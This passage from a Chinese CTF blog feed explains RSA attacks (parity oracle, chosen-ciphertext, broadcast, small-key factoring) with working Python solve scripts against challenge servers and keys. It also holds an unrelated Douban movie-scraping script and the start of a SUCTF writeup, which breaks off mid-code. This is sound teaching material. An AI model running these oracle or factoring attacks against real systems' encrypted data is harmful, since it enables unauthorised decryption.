<code>m&#39;</code> 的最低位<code>lsb</code> 是1还是0。 因为n是奇数，而<code>2*m</code> 是偶数，所以如果<code>lsb</code> 是0，说明<code>(2*m)%n</code> 是偶数，没有超过n，即<code>m&lt;n/2.0</code> ，反之则<code>m&gt;n/2.0</code> 。举个例子就能明白<code>2%3=2</code> 是偶数，而<code>4%3=1</code> 是奇数。以此类推，构造密文<code>c&quot;=(4^e)*c)%n</code> 使其解密后为<code>m&quot;=(4*m)%n</code>   ，判断<code>m&quot;</code> 的奇偶性可以知道<code>m</code> 和 <code>n/4</code> 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间。</p><p>更多信息可参考：<a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">RSA Least-Significant-Bit Oracle Attack</a>  和 <a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack" target="_blank" rel="noopener">RSA least significant bit oracle attack</a> 。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="comment"># print i, int(hi - lo)</span></span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br></pre></td></tr></table></figure><h3 id="例子：QCTF2018-XMan选拔赛-Baby-RSA"><a href="#例子：QCTF2018-XMan选拔赛-Baby-RSA" class="headerlink" title="例子：QCTF2018-XMan选拔赛/Baby RSA"></a>例子：QCTF2018-XMan选拔赛/Baby RSA</h3><p>题目如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line"></span><br><span class="line">λ nc <span class="number">47.96</span><span class="number">.239</span><span class="number">.28</span> <span class="number">23333</span></span><br><span class="line">----------------------------- baby rsa -----------------------------</span><br><span class="line">Come <span class="keyword">and</span> Decode your data</span><br><span class="line">If you give me ciphertext, I can tell you whether decoded data <span class="keyword">is</span> even <span class="keyword">or</span> odd</span><br><span class="line">You can input ciphertext(hexdecimal) now</span><br><span class="line"><span class="number">1</span></span><br><span class="line">odd</span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref:</span></span><br><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span></span><br><span class="line"><span class="comment"># https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/</span></span><br><span class="line"><span class="comment"># https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</span></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    hostname = <span class="string">'47.96.239.28'</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s.connect((hostname, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(hex(c1)[<span class="number">2</span>:].strip(<span class="string">"lL"</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'even'</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'odd'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Conducting Oracle attack..."</span></span><br><span class="line">    <span class="keyword">return</span> partial((c * c_of_2) % n, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">    c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    m = main()</span><br><span class="line">    <span class="comment"># m = 560856645743734814774953158390773525781916094468093308691660509501812349</span></span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br><span class="line">    <span class="comment"># QCTF&#123;RSA_parity_oracle_is_fun&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531637468518.png" alt="Baby RSA"></p><h2 id="选择密文攻击"><a href="#选择密文攻击" class="headerlink" title="选择密文攻击"></a>选择密文攻击</h2><p><strong>适用情况：可以构造任意密文并获得对应明文。</strong> </p><p>这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code> 使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code> 。可参看<code>模意义下的运算法则部分</code> 。</p><h2 id="广播攻击"><a href="#广播攻击" class="headerlink" title="广播攻击"></a>广播攻击</h2><p><strong>适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据</strong></p><p>使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的<code>中国剩余定理</code>小节容易求得m^e的值，当e较小时直接开e方即可，可使用<code>gmpy2.iroot(M,e)</code> 方法。</p><p>Python实现：参见本文 <code>中国剩余定理</code>小节。</p><h3 id="例子：2018强网杯nextrsa-Level9"><a href="#例子：2018强网杯nextrsa-Level9" class="headerlink" title="例子：2018强网杯nextrsa-Level9"></a>例子：2018强网杯nextrsa-Level9</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m = random.randint(<span class="number">0x100000000000</span>, <span class="number">0xffffffffffff</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class="line">n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class="line">n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br><span class="line"><span class="keyword">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h1 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h1><h2 id="【Jarvis-OJ-Medium-RSA】解析公钥文件"><a href="#【Jarvis-OJ-Medium-RSA】解析公钥文件" class="headerlink" title="【Jarvis OJ Medium RSA】解析公钥文件"></a>【Jarvis OJ Medium RSA】解析公钥文件</h2><p>使用命令从PEM文件（Privacy-Enhanced Mail 是用于存储和发送密钥、证书等数据的文件格式）中解析公钥对(n,e)，n可在线查询 (<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>) 到质因子，分解n得到p和q，便能够计算欧拉函数值及解密指数，从而解密。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\neo\Downloads\mediumRSA.rar</span><br><span class="line">λ openssl rsa -pubin -text -modulus -in pubkey.pem</span><br><span class="line">WARNING: can't open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>carck.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">n=<span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="comment"># via http://factordb.com/</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">c=int(open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">m=hex(pow(c,d,n))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(m.zfill(len(m)+<span class="number">8</span>-len(m)%<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>RSA可谓现代密码学的中流砥柱，关于它的可行攻击方法研究还有很多，诸如Timing Attack ，Padding oracle attack，Side-channel analysis attacks等类型的攻击，本文仅介绍了一些通俗易懂的方法，读者还可以阅读 <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF wiki中的非对称加密部分</a> ，以及以 <a href="https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29" target="_blank" rel="noopener">RSA (cryptosystem)</a>  为目录结合谷歌进行进一步学习。 </p><p>本文的例题附件、代码段、工具和后续更新都会放在 <a href="https://github.com/findneo/RSA-ATTACK" target="_blank" rel="noopener">RSA-ATTACK</a> ，欢迎 star &amp; watch 。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://secgroup.dais.unive.it/wp-content/uploads/2012/11/Practical-Padding-Oracle-Attacks-on-RSA.html" target="_blank" rel="noopener">Practical Padding Oracle Attacks on RSA</a> </p><p> <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF wiki中的非对称加密部分</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;本文首发&lt;a href=&quot;https://xz.aliyun.com/t/2446&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;先知社区&lt;/a&gt; ，转载请注明链接。&lt;/strong&gt; &lt;/p&gt;
&lt;h1 id=&quot;CTF中常见的RSA相关问题
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>根据豆瓣观影记录生成海报</title>
    <link href="https://findneo.github.io/180706DoubanMovie/"/>
    <id>https://findneo.github.io/180706DoubanMovie/</id>
    <published>2018-07-06T15:51:56.000Z</published>
    <updated>2019-01-25T23:21:37.025Z</updated>
    
    <content type="html"><![CDATA[<p>效果见 <a href="https://findneo.github.io/p/movie.html">findneo 的观影记录</a>  。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/</span></span><br><span class="line"><span class="comment"># http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 配置用户ID，可登陆后查看地址栏获取</span></span><br><span class="line">username=<span class="string">"findneo"</span></span><br><span class="line"><span class="comment"># 配置cookies，有些记录可能设置为仅自己可见，那么就需要登陆来获取完整记录</span></span><br><span class="line"><span class="comment"># cookie中只要有dbc12就可以表明身份</span></span><br><span class="line">cookies=dict()</span><br><span class="line"><span class="comment"># cookies=dict(dbcl2="xxxxxxxxxxxxxxxxxxx")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(url)</span>:</span></span><br><span class="line">r=requests.get(url,cookies=cookies)</span><br><span class="line">s=BeautifulSoup(r.content,<span class="string">'lxml'</span>)</span><br><span class="line">one_page=s.find_all(name=<span class="string">'a'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'nbg'</span>&#125;)</span><br><span class="line"><span class="keyword">return</span> one_page</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"https://movie.douban.com/people/%s/collect"</span>%username</span><br><span class="line">page_url=<span class="string">"https://movie.douban.com/people/findneo/collect?start=%d"</span></span><br><span class="line">r=requests.get(url,cookies=cookies)</span><br><span class="line">movie_num=int(BeautifulSoup(r.content,<span class="string">'lxml'</span>).title.string[<span class="number">12</span>:<span class="number">-2</span>])</span><br><span class="line">each_page=<span class="number">15</span></span><br><span class="line">page_num=movie_num/each_page+(movie_num%each_page!=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># page_num=1</span></span><br><span class="line">f=open(<span class="string">'res.html'</span>,<span class="string">'w+'</span>)</span><br><span class="line">content=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(page_num):</span><br><span class="line">purl=page_url%(each_page*i)</span><br><span class="line">content+=parse(purl)</span><br><span class="line">html=<span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;&lt;meta charset="UTF-8"/&gt;</span></span><br><span class="line"><span class="string">&lt;style type="text/css"&gt;img&#123; width: 10%%; height: 33.3%%; display: block; float: left;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt; %s's movie(%d)&lt;/title&gt;\n%s</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"""</span>%(username,movie_num,<span class="string">'\n'</span>.join(map(str,content)))</span><br><span class="line"><span class="string">"&lt;html&gt;&lt;body&gt;&lt;title&gt;douban&lt;/title&gt;%s"</span></span><br><span class="line">f.write(html)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2base64</span><span class="params">(infile,outfile)</span>:</span></span><br><span class="line">inf=open(infile)</span><br><span class="line">s=BeautifulSoup(inf,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.find_all(<span class="string">'img'</span>):</span><br><span class="line">i[<span class="string">'src'</span>]=<span class="string">"data:image/jpeg;base64,%s"</span>%base64.b64encode(requests.get(i[<span class="string">'src'</span>]).content)</span><br><span class="line">open(outfile,<span class="string">'w+'</span>).write(str(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># 在当前目录下生成res.html</span></span><br><span class="line">main()</span><br><span class="line"><span class="comment"># 将所有图片下载并用base64编码存储，加载时就无需从豆瓣再获取图片。</span></span><br><span class="line"><span class="comment"># img2base64('res.html','out.html')</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;效果见 &lt;a href=&quot;https://findneo.github.io/p/movie.html&quot;&gt;findneo 的观影记录&lt;/a&gt;  。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>suctf writeup</title>
    <link href="https://findneo.github.io/180527suctf/"/>
    <id>https://findneo.github.io/180527suctf/</id>
    <published>2018-05-27T14:07:58.000Z</published>
    <updated>2019-01-25T23:21:37.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sandgame"><a href="#sandgame" class="headerlink" title="sandgame"></a>sandgame</h2><p>game.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = int(flag[<span class="number">5</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"sand.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(str(sand)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>solution.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 